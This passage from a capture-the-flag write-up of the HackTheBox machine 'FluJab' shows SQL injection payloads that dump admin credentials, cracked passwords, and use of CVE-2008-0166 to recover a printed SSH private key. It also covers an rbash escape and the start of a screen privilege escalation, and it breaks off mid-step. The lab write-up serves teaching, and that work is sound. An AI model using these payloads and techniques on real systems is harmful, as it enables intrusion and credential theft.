+    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#                                          
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-got-a-login-name-an-email-address-and-a-link-to-a-sysadmin-console-but-we-still-need-a-password-i-dont-know-if-i-had-to-enumerate-more-until-i-get-the-column-password-but-anyway-i-just-added-password-hoping-that-theres-a-column-called-password-and-i-was-right-&quot;&gt;We got a login name, an email address and a link to a sysadmin console. But we still need a password. I don’t know if I had to enumerate more until I get the column &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; but anyway I just added password hoping that there’s a column called password, and I was right :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;smtp--9&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 16:03:22 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:sysadm:administrator:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:syadmin@flujab.htb:sysadmin-console-01.flujab.htb
+Message-ID: &amp;lt;783cf28dd5b1c56f309b9a45724c5ec5@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#                             
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;lets-take-a-look-at-what-we-have-&quot;&gt;let’s take a look at what we have :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;password-is-a-sha256-hash-i-used-crackstation-to-crack-it-&quot;&gt;Password is a &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256&lt;/code&gt; hash. I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack it :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;password--th3doct0r&quot;&gt;Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;th3doct0r&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;i-added-sysadmin-console-01flujabhtb-to-etchosts-then-i-went-to-httpsysadmin-console-01flujabhtb-&quot;&gt;I added &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin-console-01.flujab.htb&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; then I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sysadmin-console-01.flujab.htb/&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/81.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/82.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-got-the-direct-ip-access-error-again-but-this-time-on-port-8080-i-didnt-get-the-same-error-&quot;&gt;I got the direct ip access error again. But this time on port 8080 I didn’t get the same error :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/83.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/84.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;ajenti-administration-panel-note--it-wont-be-accessible-if-your-ip-wasnt-in-the-whitelist&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; administration panel. (Note : It won’t be accessible if your ip wasn’t in the whitelist)&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;cve-2008-0166-user-flag&quot;&gt;CVE-2008-0166, User Flag&lt;/h3&gt;
+&lt;h4 id=&quot;after-getting-in-the-first-thing-i-noticed-was-the-notepad-&quot;&gt;After getting in the first thing I noticed was the notepad :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/85.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/86.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/87.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;nice-so-we-can-read-and-write-some-stuff-on-the-server-i-checked-the-home-directory-and-it-had-a-lot-of-users-with-a-lot-of-user-flags-&quot;&gt;Nice so we can read and write some stuff on the server. I checked the home directory and it had a lot of users with a lot of user flags ….&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/88.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;for-example-&quot;&gt;For example :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/89.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/90.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-one-user-called-drno-had-ssh-directory-with-a-key-in-it&quot;&gt;But one user called &lt;code class=&quot;highlighter-rouge&quot;&gt;drno&lt;/code&gt; had &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; directory with a key in it.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/91.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/92.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/93.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;userkey-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;userkey&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B
+
+zPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8
+w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5
+wMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay
+v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq
+OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy
+gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1
+thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT
+jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf
+RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT
+jSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/
+S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K
+nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH
+M6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT
+0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw
+4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o
+GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2
+hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR
+i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd
+hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a
+q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e
+h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl
+BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul
+9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI
+LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
+ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;unfortunately-it-was-encrypted-so-i-used-ssh2john-then-i-cracked-it-&quot;&gt;Unfortunately it was encrypted so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh2john&lt;/code&gt; then I cracked it :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/94.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/95.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;password--shadowtroll&quot;&gt;Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;shadowtroll&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;chmod-600-drnokey-then-i-used-the-key-to-ssh-as-drno-and-we-got-the-user-flag-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 600 drno.key&lt;/code&gt;, then I used the key to ssh as &lt;code class=&quot;highlighter-rouge&quot;&gt;drno&lt;/code&gt; and we got the user flag :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/96.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;nope-we-only-got-a-connection-reset-i-went-back-to-the-administration-panel-and-took-a-look-at-etchostsallow-&quot;&gt;Nope we only got a connection reset. I went back to the administration panel and took a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts.allow&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/97.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-added-my-ip-address-and-tried-again-&quot;&gt;I added my ip address and tried again :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/98.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/99.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;still-a-connection-reset-i-went-back-and-added-sshd--all&quot;&gt;Still a connection reset. I went back and added &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd : ALL&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/100.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/101.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-worked-but-now-it-doesnt-accept-the-key-it-was-just-a-troll-anyway-we-got-the-public-key-in-authorized_keys-&quot;&gt;It worked but now it doesn’t accept the key. It was just a troll. Anyway we got the public key in &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/102.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# shell whitelisting + key auth enabled 
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-tried-cve-2008-0166-i-downloaded-the-files-from-here-then-i-extracted-them-in-a-directory-called-cve-2008-0166-then-i-used-grep-to-search-for-the-last-line-in-the-public-key--yv8c1uai3lunrsh9rxfnox1rtz73ucmgtbacomvqy9mpi96rizm2qbe26v1mxiqnktu03cbne8tdd96txonmaxe-through-all-files-&quot;&gt;I tried &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2008-0166&lt;/code&gt;&lt;/a&gt;. I downloaded the files from &lt;a href=&quot;https://github.com/g0tmi1k/debian-ssh&quot;&gt;here&lt;/a&gt; then I extracted them in a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;cve-2008-0166&lt;/code&gt;. Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; to search for the last line in the public key : &lt;code class=&quot;highlighter-rouge&quot;&gt;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&lt;/code&gt; through all files :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;grep -r -n &quot;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&quot; cve-2008-0166/*&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/103.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-matched-this-public-key--debian_ssh_rsa_4096_x86rsa4096dead0b5b829ea2e3d22f47a7cbde17a6-23269pub-so-i-grabbed-the-private-key--dead0b5b829ea2e3d22f47a7cbde17a6-23269-and-used-it-to-get-ssh&quot;&gt;It matched this public key : &lt;code class=&quot;highlighter-rouge&quot;&gt;debian_ssh_rsa_4096_x86/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub&lt;/code&gt; so I grabbed the private key : &lt;code class=&quot;highlighter-rouge&quot;&gt;dead0b5b829ea2e3d22f47a7cbde17a6-23269&lt;/code&gt; and used it to get ssh.&lt;/h4&gt;
+&lt;h4 id=&quot;dead0b5b829ea2e3d22f47a7cbde17a6-23269-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dead0b5b829ea2e3d22f47a7cbde17a6-23269&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
+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
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/104.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;bypassing-restricted-bash-local-privilege-escalation-vulnerability-in-screen-root-flag&quot;&gt;Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag&lt;/h3&gt;
+&lt;h4 id=&quot;after-getting-ssh-access-i-found-myself-in-rbash-&quot;&gt;After getting ssh access I found myself in &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/105.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;after-trying-some-stuff-i-could-bypass-it-by-adding-the--t-option-when-trying-to-ssh-&quot;&gt;After trying some stuff I could bypass it by adding the &lt;code class=&quot;highlighter-rouge&quot;&gt;-t&lt;/code&gt; option when trying to ssh :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@flujab.htb -t &quot;bash --noprofile&quot;&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/106.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-had-to-fix-my-path-&quot;&gt;Then I had to fix my path :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/107.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-did-some-regular-enumeration-steps-one-of-them-is-searching-for-suid-binaries-&quot;&gt;I did some regular enumeration steps, one of them is searching for &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binaries :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm -4000 2&amp;gt;/dev/null&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/108.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;one-thing-that-caught-my-attention-was-usrlocalsharescreenscreen&quot;&gt;One thing that caught my attention was &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/share/screen/screen&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;i-checked-the-version-of-screen-&quot;&gt;I checked the version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;screen -v&lt;/code&gt; :
+&lt;img src=&quot;/images/hackthebox/flujab/109.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-was-version-45-which-is-vulnerable-to-a-local-privilege-escalation-vulnerability-and-theres-a-published-exploit-for-it-here-however-by-looking-at-that-exploit-&quot;&gt;It was version 4.5 which is vulnerable to a Local Privilege Escalation Vulnerability and there’s a published exploit for it &lt;a href=&quot;https://www.exploit-db.com/exploits/41154&quot;&gt;here&lt;/a&gt;. However by looking at that exploit :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/110.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-can-see-that-its-compiling-stuff-and-unfortunately-gcc-wasnt-installed-on-the-machine-&quot;&gt;We can see that it’s compiling stuff. And unfortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt; wasn’t installed on the machine :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/111.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
